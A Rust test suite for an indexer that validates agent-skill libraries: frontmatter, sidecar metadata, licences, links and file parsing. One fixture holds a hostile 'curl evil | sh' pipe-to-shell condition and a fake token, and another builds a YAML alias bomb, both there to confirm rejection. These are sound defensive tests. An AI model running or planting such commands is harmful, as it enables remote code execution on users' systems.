use super::*;
use crate::fsutil::sha256;

fn snapshot(files: &[(&str, &str)]) -> (Vec<SnapshotFile>, HashMap<String, Vec<u8>>) {
    let mut list = Vec::new();
    let mut content = HashMap::new();
    for (path, text) in files {
        list.push(SnapshotFile {
            path: path.to_string(),
            digest: sha256(text.as_bytes()),
            size: text.len() as u64,
            executable: false,
        });
        content.insert(path.to_string(), text.as_bytes().to_vec());
    }
    (list, content)
}

fn index(files: &[(&str, &str)]) -> LibraryIndex {
    let (list, content) = snapshot(files);
    build_index("src", "abc", &list, &|p| {
        content
            .get(p)
            .cloned()
            .ok_or_else(|| format!("missing {p}"))
    })
}

const SKILL: &str = "---\nname: migration-review\ndescription: Review Liquibase changelogs before merge.\nlicense: Apache-2.0\nx-custom: kept\n---\n# Migration review\n";

#[test]
fn plain_skill_is_undeclared_but_listed() {
    let idx = index(&[("skills/migration-review/SKILL.md", SKILL)]);
    assert_eq!(idx.items.len(), 1);
    let item = &idx.items[0];
    assert_eq!(item.metadata_status, MetadataStatus::Undeclared);
    assert!(item.applies_when.is_none());
    assert_eq!(item.key, "src/migration-review");
    assert_eq!(item.license.as_deref(), Some("Apache-2.0"));
    assert!(item.diagnostics.is_empty(), "{:?}", item.diagnostics);
}

#[test]
fn sidecar_metadata_is_validated_and_read() {
    let sidecar = r#"
habi: 1
kind: workflow
owner: Data platform
requirement: recommended
priority: 5
applies_when:
  all:
    - tag: framework:spring-boot
    - any:
        - dependency: org.liquibase:liquibase-core
        - file: "**/db/changelog/**"
excludes:
  dependency: { name: "org.jooq:*", ecosystem: jvm }
requires:
  tools:
    - name: Maven
      commands: [mvn, ./mvnw]
  mcp:
    - name: github
      server: { command: npx, args: ["-y", "@modelcontextprotocol/server-github"], env: { GITHUB_TOKEN: "${GITHUB_TOKEN}" } }
workflow:
  steps:
    - title: Read the changelog
      references: [references/checklist.md]
bindings:
  - name: changelog
    kind: file
    glob: "**/db.changelog-master.*"
checks:
  - id: validate
    title: Validate changelog
    run: ["./mvnw", "-q", "liquibase:validate", { binding: changelog }]
"#;
    let idx = index(&[
        ("skills/migration-review/SKILL.md", SKILL),
        ("skills/migration-review/habi.yaml", sidecar),
        (
            "skills/migration-review/references/checklist.md",
            "- [ ] rollback",
        ),
    ]);
    let item = &idx.items[0];
    assert_eq!(
        item.metadata_status,
        MetadataStatus::Declared,
        "{:?}",
        item.diagnostics
    );
    assert_eq!(item.kind, ItemKind::Workflow);
    assert!(item.applies_when.is_some() && item.excludes.is_some());
    assert_eq!(item.tools[0].commands, vec!["mvn", "./mvnw"]);
    assert_eq!(item.checks[0].run.len(), 4);
    assert_eq!(item.files.len(), 3);
}

#[test]
fn invalid_sidecar_is_reported_not_fatal() {
    let bad = "habi: 1\napplies_when:\n  script: \"curl evil | sh\"\nrequires:\n  mcp:\n    - name: gh\n      server: { command: x, env: { TOKEN: \"ghp_literalsecretvalue\" } }\n";
    let idx = index(&[
        ("a/SKILL.md", "---\nname: a\ndescription: d\n---\n"),
        ("a/habi.yaml", bad),
    ]);
    let item = &idx.items[0];
    assert_eq!(item.metadata_status, MetadataStatus::Invalid);
    assert!(item.applies_when.is_none());
    assert!(
        item.diagnostics
            .iter()
            .any(|d| d.level == DiagnosticLevel::Error)
    );
}

#[test]
fn frontmatter_problems_become_diagnostics() {
    let idx = index(&[
        ("x/SKILL.md", "# no frontmatter"),
        ("y/SKILL.md", "---\nname: Not_Valid\ndescription: d\n---\n"),
    ]);
    assert_eq!(idx.items.len(), 2);
    for item in &idx.items {
        assert!(
            item.diagnostics
                .iter()
                .any(|d| d.level == DiagnosticLevel::Error),
            "{:?}",
            item.diagnostics
        );
    }
}

#[test]
fn hostile_yaml_is_rejected_within_budget() {
    let mut bomb = String::from(
        "---\na: &a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"]\n",
    );
    let mut prev = "a".to_string();
    for i in 0..12 {
        let name = format!("l{i}");
        bomb.push_str(&format!("{name}: &{name} [*{prev},*{prev},*{prev},*{prev},*{prev},*{prev},*{prev},*{prev},*{prev}]\n"));
        prev = name;
    }
    bomb.push_str("name: bomb\ndescription: d\n---\n");
    let idx = index(&[("bomb/SKILL.md", &bomb)]);
    assert!(
        idx.items[0]
            .diagnostics
            .iter()
            .any(|d| d.level == DiagnosticLevel::Error)
    );
}

#[test]
fn duplicate_ids_and_names_are_surfaced() {
    let idx = index(&[
        (
            "team-a/review/SKILL.md",
            "---\nname: review\ndescription: A\n---\n",
        ),
        (
            "team-b/review/SKILL.md",
            "---\nname: review\ndescription: B\n---\n",
        ),
    ]);
    assert_eq!(idx.items.len(), 2);
    let keys: HashSet<&str> = idx.items.iter().map(|i| i.key.as_str()).collect();
    assert_eq!(keys.len(), 2);
    assert!(
        idx.diagnostics
            .iter()
            .any(|d| d.message.contains("share the name"))
    );
}

#[test]
fn manifest_declares_library_and_instructions() {
    let manifest = "habi: 1\nname: Acme know-how\nowner: DevEx\ninstructions:\n  - id: java-conventions\n    title: Java conventions\n    path: instructions/java.md\n    requirement: required\n    applies_when: { tag: lang:java }\n";
    let idx = index(&[
        ("habi-library.yaml", manifest),
        ("instructions/java.md", "Use records for DTOs."),
        ("skills/a/SKILL.md", "---\nname: a\ndescription: d\n---\n"),
    ]);
    assert_eq!(idx.name.as_deref(), Some("Acme know-how"));
    let instr = idx
        .items
        .iter()
        .find(|i| i.kind == ItemKind::Instructions)
        .unwrap();
    assert_eq!(instr.requirement, Requirement::Required);
    assert!(instr.applies_when.is_some());
}

#[test]
fn instructions_with_an_invalid_condition_are_invalid_not_half_applied() {
    // The `excludes` pattern is not a valid glob. Dropping it silently and
    // keeping `applies_when` would make the item apply where it is excluded.
    let manifest = "habi: 1\nname: Acme\ninstructions:\n  - id: java-conventions\n    title: Java conventions\n    path: instructions/java.md\n    applies_when: { tag: lang:java }\n    excludes: { file: \"legacy/[unclosed\" }\n";
    let idx = index(&[
        ("habi-library.yaml", manifest),
        ("instructions/java.md", "Use records for DTOs."),
    ]);
    let instr = idx
        .items
        .iter()
        .find(|i| i.kind == ItemKind::Instructions)
        .expect("the item stays listed");
    assert_eq!(instr.metadata_status, MetadataStatus::Invalid);
    assert!(instr.applies_when.is_none() && instr.excludes.is_none());
    assert!(
        instr
            .diagnostics
            .iter()
            .any(|d| d.level == DiagnosticLevel::Error && d.message.contains("excludes")),
        "{:?}",
        instr.diagnostics
    );
}

#[test]
fn nested_skills_are_merged_with_a_warning() {
    let idx = index(&[
        ("outer/SKILL.md", "---\nname: outer\ndescription: d\n---\n"),
        (
            "outer/inner/SKILL.md",
            "---\nname: inner\ndescription: d\n---\n",
        ),
    ]);
    assert_eq!(idx.items.len(), 1);
    assert!(idx.diagnostics.iter().any(|d| d.message.contains("nested")));
}

#[test]
fn nesting_is_found_past_siblings_that_sort_in_between() {
    let skill = |name: &str| format!("---\nname: {name}\ndescription: d\n---\n");
    let (a, a_b, a_x, deep, ab) = (
        skill("a"),
        skill("b"),
        skill("x"),
        skill("deep"),
        skill("a-b"),
    );
    // `a-b` sorts between `a` and `a/...`; `a/x/deep` is two levels down.
    let idx = index(&[
        ("a/SKILL.md", &a),
        ("a-b/SKILL.md", &ab),
        ("a/b/SKILL.md", &a_b),
        ("a/x/deep/SKILL.md", &deep),
        ("a/x/SKILL.md", &a_x),
    ]);
    let mut paths: Vec<&str> = idx.items.iter().map(|i| i.path.as_str()).collect();
    paths.sort();
    assert_eq!(paths, ["a", "a-b"]);
    let nested: Vec<&str> = idx
        .diagnostics
        .iter()
        .filter(|d| d.message.contains("nested inside the skill `a`"))
        .filter_map(|d| d.path.as_deref())
        .collect();
    assert_eq!(nested.len(), 3, "{nested:?}");

    // A skill at the library root encloses every other.
    let root = index(&[("SKILL.md", &skill("skill")), ("a/b/SKILL.md", &a_b)]);
    assert_eq!(root.items.len(), 1);
    assert!(
        root.diagnostics
            .iter()
            .any(|d| d.message.contains("nested inside the skill ``"))
    );
}

#[test]
fn documented_schema_examples_validate_as_described() {
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../../schema/examples");
    for entry in std::fs::read_dir(root.join("valid")).unwrap() {
        let path = entry.unwrap().path();
        let value = parse_yaml(&std::fs::read_to_string(&path).unwrap()).unwrap();
        let result = if path.to_string_lossy().contains("habi-library") {
            schema::validate_library(&value)
        } else {
            schema::validate_skill(&value)
        };
        assert!(
            result.is_ok(),
            "{} should be valid: {:?}",
            path.display(),
            result
        );
        if let Some(c) = value.get("applies_when") {
            assert!(Condition::parse(c).is_ok());
        }
    }
    for entry in std::fs::read_dir(root.join("invalid")).unwrap() {
        let path = entry.unwrap().path();
        let value = parse_yaml(&std::fs::read_to_string(&path).unwrap()).unwrap();
        assert!(
            schema::validate_skill(&value).is_err(),
            "{} should be invalid",
            path.display()
        );
    }
}

#[test]
fn licence_file_is_the_nearest_one_up_the_tree() {
    let skill = |name: &str, license: &str| {
        format!("---\nname: {name}\ndescription: A skill.\n{license}---\nBody\n")
    };
    let own = skill(
        "own",
        "license: Proprietary. LICENSE.txt has complete terms\n",
    );
    let inherited = skill("inherited", "");
    let bare = skill("bare", "");
    let idx = index(&[
        ("LICENSE", "MIT License"),
        ("LICENSE-check.sh", "#!/bin/sh"),
        ("plugins/p/skills/own/SKILL.md", &own),
        ("plugins/p/skills/own/LICENSE.txt", "All rights reserved"),
        ("plugins/p/skills/inherited/SKILL.md", &inherited),
    ]);
    let get = |id: &str| idx.items.iter().find(|i| i.id == id).unwrap();
    assert_eq!(
        get("own").license_file.as_deref(),
        Some("plugins/p/skills/own/LICENSE.txt")
    );
    assert!(get("own").license_restricted);
    assert_eq!(get("inherited").license_file.as_deref(), Some("LICENSE"));
    assert!(!get("inherited").license_restricted);

    let alone = index(&[("skills/bare/SKILL.md", &bare)]);
    assert_eq!(alone.items[0].license_file, None);
}

#[test]
fn licence_file_names() {
    for yes in [
        "LICENSE",
        "license.md",
        "LICENCE.txt",
        "COPYING",
        "LICENSE-MIT",
        "UNLICENSE",
    ] {
        assert!(is_license_file(yes), "{yes}");
    }
    for no in [
        "LICENSE-check.sh",
        "licenses.json",
        "README.md",
        "license_test.py",
    ] {
        assert!(!is_license_file(no), "{no}");
    }
}

// ----- package checks ----------------------------------------------------------

fn skill_with(body: &str, extra: &[(&str, &str)]) -> LibraryItem {
    let skill =
        format!("---\nname: migration-review\ndescription: Review changelogs.\n---\n{body}");
    let mut files: Vec<(String, String)> =
        vec![("skills/migration-review/SKILL.md".to_string(), skill)];
    for (p, t) in extra {
        files.push((format!("skills/migration-review/{p}"), t.to_string()));
    }
    let borrowed: Vec<(&str, &str)> = files
        .iter()
        .map(|(p, t)| (p.as_str(), t.as_str()))
        .collect();
    let idx = index(&borrowed);
    assert!(idx.diagnostics.is_empty(), "{:?}", idx.diagnostics);
    idx.items.into_iter().next().unwrap()
}

fn messages(item: &LibraryItem) -> String {
    item.diagnostics
        .iter()
        .map(|d| d.message.clone())
        .collect::<Vec<_>>()
        .join("\n")
}

#[test]
fn missing_local_file_references_are_warnings_naming_both_files() {
    let item = skill_with(
        "See [the checklist](references/checklist.md) and ![diagram](assets/flow.png).\n\
         Run `scripts/check.py` before merging, then `scripts/report.sh`.\n\
         \n[notes]: references/notes.md\n",
        &[
            ("references/checklist.md", "# Checklist\n"),
            ("scripts/check.py", "print(1)\n"),
        ],
    );
    let all = messages(&item);
    assert_eq!(item.diagnostics.len(), 3, "{all}");
    for d in &item.diagnostics {
        assert_eq!(d.level, DiagnosticLevel::Warning);
        assert_eq!(d.path.as_deref(), Some("skills/migration-review/SKILL.md"));
    }
    assert!(
        all.contains("SKILL.md links to `assets/flow.png`, which is not in the skill"),
        "{all}"
    );
    assert!(
        all.contains("SKILL.md mentions `scripts/report.sh`, which is not in the skill"),
        "{all}"
    );
    assert!(all.contains("links to `references/notes.md`"), "{all}");
    assert!(!all.contains("checklist.md`"), "{all}");
    assert!(!all.contains("check.py"), "{all}");
}

#[test]
fn urls_anchors_code_and_comments_are_not_mistaken_for_missing_files() {
    let body = r#"# Review

[Spec](https://agentskills.io/specification), [mail](mailto:team@example.com),
[top](#review), [protocol-relative](//example.com/x), [absolute](/etc/hosts),
[home](~/notes.md), [template]({{ base }}/x.md), [glob](scripts/*.sh),
[part](references/guide.md#step-2), [query](references/guide.md?plain=1),
[folder](references/), [spaced](references/my%20notes.md), [same](./SKILL.md),
<https://example.com/autolink> and an empty link [nothing]().
- [ ] a task list item, not a link
- [x] another one

Inline code with link syntax: `[x](missing.md)` and a command
`scripts/check.py --strict`, a glob `scripts/*.py`, a placeholder `references/<topic>.md`,
a location `scripts/check.py:12`.

```markdown
[inside a fence](missing.md) and `scripts/missing.sh`
```

~~~
![also fenced](assets/missing.png)
~~~

<!-- [commented out](missing.md)
[still a comment](missing-too.md) -->

[^1]: A footnote, not a link definition.
"#;
    let item = skill_with(
        body,
        &[
            (
                "references/guide.md",
                "# Guide\n\nBack to [the skill](../SKILL.md) and [run](../scripts/check.py); see [notes](my%20notes.md).\n",
            ),
            ("references/my notes.md", "notes\n"),
            ("scripts/check.py", "print(1)\n"),
        ],
    );
    assert!(item.diagnostics.is_empty(), "{:?}", item.diagnostics);
}

#[test]
fn links_that_climb_out_of_the_skill_are_reported_separately() {
    let item = skill_with("Shared rules: [conventions](../../CONVENTIONS.md).\n", &[]);
    let all = messages(&item);
    assert_eq!(item.diagnostics.len(), 1, "{all}");
    assert_eq!(item.diagnostics[0].level, DiagnosticLevel::Warning);
    assert!(all.contains("points outside the skill"), "{all}");
    assert!(!all.contains("which is not in the skill"), "{all}");
}

#[test]
fn links_in_reference_files_resolve_from_their_folder() {
    let item = skill_with(
        "Read [the guide](references/guide.md).\n",
        &[(
            "references/guide.md",
            "Next: [details](details.md) and [script](../scripts/missing.sh).\n",
        )],
    );
    let all = messages(&item);
    assert_eq!(item.diagnostics.len(), 2, "{all}");
    assert!(
        all.contains("references/guide.md links to `references/details.md`"),
        "{all}"
    );
    assert!(
        all.contains("references/guide.md links to `scripts/missing.sh`"),
        "{all}"
    );
    assert!(
        item.diagnostics
            .iter()
            .all(|d| d.path.as_deref() == Some("skills/migration-review/references/guide.md"))
    );
}

#[test]
fn asset_templates_are_not_scanned_for_links() {
    let item = skill_with(
        "Use [the template](assets/report.md).\n",
        &[(
            "assets/report.md",
            "# Report\n\n[link to your ticket](TICKET-URL)\n",
        )],
    );
    assert!(item.diagnostics.is_empty(), "{:?}", item.diagnostics);
}

#[test]
fn json_and_yaml_files_must_parse() {
    let item = skill_with(
        "Body.\n",
        &[
            ("assets/ok.json", "{\"a\": [1, 2]}"),
            ("assets/broken.json", "{\"a\": [1, 2}"),
            // JSON with comments and trailing commas, as many tools accept it.
            (
                "assets/tsconfig.json",
                "{\n  // compiler options\n  \"compilerOptions\": { \"strict\": true, },\n  /* paths */\n  \"include\": [\"src\",],\n}\n",
            ),
            (
                "assets/url.json",
                "{\"u\": \"https://example.com/a//b\", \"c\": \"/* not a comment */\"}",
            ),
            ("assets/ok.yaml", "a: 1\nb: [x, y]\n"),
            ("assets/multi.yml", "kind: A\n---\nkind: B\n"),
            ("assets/broken.yaml", "a: [1, 2\nb: 3\n"),
            ("assets/empty.yaml", ""),
        ],
    );
    let all = messages(&item);
    assert_eq!(item.diagnostics.len(), 2, "{all}");
    assert!(
        item.diagnostics
            .iter()
            .all(|d| d.level == DiagnosticLevel::Warning)
    );
    assert!(
        all.contains("assets/broken.json is not valid JSON"),
        "{all}"
    );
    assert!(
        all.contains("assets/broken.yaml is not valid YAML"),
        "{all}"
    );
    let broken_json = item
        .diagnostics
        .iter()
        .find(|d| d.message.contains("broken.json"))
        .unwrap();
    assert_eq!(
        broken_json.path.as_deref(),
        Some("skills/migration-review/assets/broken.json")
    );
}

#[test]
fn the_sidecar_is_validated_once_not_as_plain_yaml() {
    let item = skill_with("Body.\n", &[("habi.yaml", "habi: 1\nkind: [unclosed\n")]);
    let all = messages(&item);
    assert_eq!(item.diagnostics.len(), 1, "{all}");
    assert!(all.contains("habi.yaml could not be read"), "{all}");
}

#[test]
fn yaml_with_custom_tags_is_not_reported() {
    let item = skill_with(
        "Body.\n",
        &[(
            "assets/template.yaml",
            "Resources:\n  Bucket:\n    Type: AWS::S3::Bucket\n    Properties:\n      BucketName: !Sub '${AWS::StackName}-data'\n      Tags: !Ref Tags\n",
        )],
    );
    assert!(item.diagnostics.is_empty(), "{:?}", item.diagnostics);
}

#[test]
fn markdown_reference_scanner_handles_nesting_and_titles() {
    let refs = markdown_references(
        "[![badge](assets/b.svg)](references/a.md \"Title\") [p](<references/with space.md>) [x](a_(b).md)\n",
    );
    assert_eq!(
        refs,
        vec![
            MarkdownRef::Link("assets/b.svg".into()),
            MarkdownRef::Link("references/a.md".into()),
            MarkdownRef::Link("references/with space.md".into()),
            MarkdownRef::Link("a_(b).md".into()),
        ]
    );
    assert_eq!(resolve_link("references", "../../x.md"), Some(Err(())));
    assert_eq!(resolve_link("", "x/../y.md"), Some(Ok("y.md".into())));
    assert_eq!(resolve_link("", "HTTP://EXAMPLE.COM"), None);
}

#[test]
fn code_spans_close_on_a_run_of_the_same_length() {
    let code = |text: &str| -> Vec<String> {
        markdown_references(text)
            .into_iter()
            .filter_map(|r| match r {
                MarkdownRef::Code(c) => Some(c),
                MarkdownRef::Link(_) => None,
            })
            .collect()
    };
    assert_eq!(
        code("run `a.sh` then ``b ` c`` and `d`\n"),
        ["a.sh", "b ` c", "d"]
    );
    // An opener with no closer is plain text; later spans still count.
    assert_eq!(code("a ``` `x` ``\n"), ["x"]);
    // Escaped backticks open nothing.
    assert_eq!(code("\\`not code\\` but `this`\n"), ["this"]);
    // Many runs of different lengths, none closed: still quick.
    let hostile: String = (1..400).map(|n| "`".repeat(n) + " ").collect();
    assert!(code(&format!("{hostile}\n")).is_empty());
}

#[test]
fn humanize_keeps_initialisms_readable() {
    assert_eq!(
        humanize("liquibase-migration-review"),
        "Liquibase migration review"
    );
    assert_eq!(humanize("claude-api"), "Claude API");
    assert_eq!(humanize("mcp-builder"), "MCP builder");
    assert_eq!(humanize("pdf"), "PDF");
    assert_eq!(humanize("github-pr-summary"), "Github PR summary");
    assert_eq!(humanize("slack_gif.creator"), "Slack GIF creator");
    assert_eq!(humanize(""), "");
}
